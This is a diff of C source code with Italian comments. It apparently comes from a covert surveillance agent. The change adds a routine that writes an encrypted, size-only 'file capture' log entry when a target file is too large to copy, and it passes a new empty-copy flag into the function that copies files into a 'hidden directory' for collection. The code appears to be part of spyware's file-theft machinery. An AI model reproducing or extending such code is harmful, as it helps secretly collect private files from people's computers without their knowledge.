@@ -805,10 +805,81 @@ BOOL Log_CryptCopyFile(WCHAR *src_path, char *dest_file_path, WCHAR *display_nam
 	return TRUE;
 }
 
+// Crea un file di log di tipo "file capture" vuoto, nel caso non sia stato possibile catturarlo per size 
+// Specifica la size nel nome del file stesso
+BOOL Log_CryptCopyEmptyFile(WCHAR *src_path, char *dest_file_path, WCHAR *display_name, DWORD existent_file_len, DWORD agent_tag)
+{
+	HANDLE hdst;
+	DWORD dwRead;
+	BY_HANDLE_FILE_INFORMATION dst_info;
+	DWORD existent_file_size = 0;
+	BYTE *file_additional_data;
+	BYTE *log_file_header;
+	FileAdditionalData *file_additiona_data_header;
+	DWORD header_len;
+	WCHAR to_display[MAX_PATH];
+
+	if (display_name) 
+		_snwprintf_s(to_display, sizeof(to_display)/sizeof(WCHAR), _TRUNCATE, L"%s [%dB]", display_name, existent_file_len);		
+	else
+		_snwprintf_s(to_display, sizeof(to_display)/sizeof(WCHAR), _TRUNCATE, L"%s [%dB]", src_path, existent_file_len);		
+
+	// Crea l'header da scrivere nel file
+	if ( !(file_additional_data = (BYTE *)malloc(sizeof(FileAdditionalData) + wcslen(to_display) * sizeof(WCHAR))))
+		return FALSE;
+	file_additiona_data_header = (FileAdditionalData *)file_additional_data;
+	file_additiona_data_header->uVersion = LOG_FILE_VERSION;
+	file_additiona_data_header->uFileNameLen = wcslen(to_display) * sizeof(WCHAR);
+	memcpy(file_additiona_data_header+1, to_display, file_additiona_data_header->uFileNameLen);
+	log_file_header = Log_CreateHeader(agent_tag, file_additional_data, file_additiona_data_header->uFileNameLen + sizeof(FileAdditionalData), &header_len);
+	SAFE_FREE(file_additional_data);
+	if (!log_file_header)
+		return FALSE;
+	
+	// Prende le info del file destinazione (se esiste)
+	hdst = FNC(CreateFileA)(dest_file_path, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, 0, NULL);
+	if (hdst != INVALID_HANDLE_VALUE) {
+		if (FNC(GetFileInformationByHandle)(hdst, &dst_info)) {
+			existent_file_size = dst_info.nFileSizeLow;
+		}
+		CloseHandle(hdst);
+	}
+
+	// Controlla che ci sia ancora spazio per scrivere su disco
+	if ((log_free_space + existent_file_size)<= MIN_CREATION_SPACE) {
+		SAFE_FREE(log_file_header);
+		return FALSE;
+	}
+
+	hdst = FNC(CreateFileA)(dest_file_path, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, 0, NULL);
+	if (hdst == INVALID_HANDLE_VALUE) {
+		SAFE_FREE(log_file_header);
+		return FALSE;
+	}
+	// Se il file e' stato sovrascritto (e con successo) restituisce la quota disco
+	// recuperata.
+	log_free_space += existent_file_size;
+
+	// Scrive l'header nel file
+	if (!FNC(WriteFile)(hdst, log_file_header, header_len, &dwRead, NULL)) {
+		CloseHandle(hdst);
+		SAFE_FREE(log_file_header);
+		return FALSE;
+	}
+	if (log_free_space >= header_len)
+		log_free_space -= header_len;
+
+	SAFE_FREE(log_file_header);
+	FNC(FlushFileBuffers)(hdst);
+	CloseHandle(hdst);
+	return TRUE;
+}
+
+
 // Copia il file nella directory nascosta. Fa un hash del path.
 // File con path uguale vengono sovrascritti. Effettua la copia solo
 // se la destinazione non ha la stessa data della sorgente.
-BOOL Log_CopyFile(WCHAR *src_path, WCHAR *display_name, DWORD agent_tag)
+BOOL Log_CopyFile(WCHAR *src_path, WCHAR *display_name, BOOL empty_copy, DWORD agent_tag)
 {
 	HANDLE hfile;
 	BY_HANDLE_FILE_INFORMATION src_info, dst_info;
@@ -891,6 +962,13 @@ BOOL Log_CopyFile(WCHAR *src_path, WCHAR *display_name, DWORD agent_tag)
 		dst_date.lo_delay = dst_info.ftLastWriteTime.dwLowDateTime;
 		if (!IsGreaterDate(&src_date, &dst_date)) 
 			return FALSE;
+	}
+	
+	// Se non doveva essere copiato tutto per via della size...
+	if (empty_copy) {
+		if (!Log_CryptCopyEmptyFile(src_path, dest_file_path, display_name, src_info.nFileSizeLow, agent_tag)) 
+			return FALSE;
+		return TRUE;
 	}
 
 	// Effettua la vera copia.
